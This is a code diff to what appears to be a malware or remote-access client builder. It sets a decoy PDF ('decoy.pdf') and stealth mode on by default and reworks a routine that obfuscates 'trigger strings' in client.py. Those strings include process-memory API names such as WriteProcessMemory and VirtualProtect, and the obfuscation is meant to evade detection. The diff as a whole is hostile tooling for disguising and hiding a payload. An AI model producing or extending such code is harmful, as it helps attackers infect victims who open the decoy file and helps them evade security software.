@@ -18,8 +18,8 @@ DEFAULTS = {
     "icon": "",
     "upx": False,
     "onefile": True,
-    "use_pdf": False,
-    "pdf_path": "",
+    "use_pdf": True,
+    "pdf_path": "decoy.pdf",
     "stealth": True,
 }
 
@@ -299,25 +299,15 @@ class Manager:
         "NtQuerySystemInformation", "SystemHandleInformation", "VirtualQuery",
         "VirtualProtect", "WriteProcessMemory", "ReadProcessMemory",
         # — Common globals —
-        "DEVICE_ID", "HOSTNAME", "SERVER_IP", "SERVER_PORT",
+        "DEVICE_ID", "HOSTNAME",
     ]
 
     def _obfuscate_client(self):
-        backup = Path("client.py.bak")
-        orig = Path("client.py")
-        if backup.exists():
-            # Verify backup has original _s() function; if not, refresh from current (git-clean) state
-            if "def _s(blob)" not in backup.read_text("utf-8"):
-                backup.write_text(orig.read_text("utf-8"), "utf-8")
-            orig.write_text(backup.read_text("utf-8"), "utf-8")
-        else:
-            backup.write_text(orig.read_text("utf-8"), "utf-8")
-
         if not self.config.get("stealth"):
             return
 
         self._build_key = self._gen_key()
-        src = orig.read_text("utf-8")
+        src = Path("client.py").read_text("utf-8")
         src = self._inject_key(src)
 
         changed = 0
@@ -334,7 +324,7 @@ class Manager:
         src = src.replace("_s(", f"{fn_repl}(")
 
         if changed:
-            orig.write_text(src, "utf-8")
+            Path("client.py").write_text(src, "utf-8")
             print(f"  [+] Obfuscated {changed} strings (fn: {fn_repl}, key: {self._build_key.hex()[:8]}...)")
         else:
             print("  [-] No trigger strings to obfuscate")
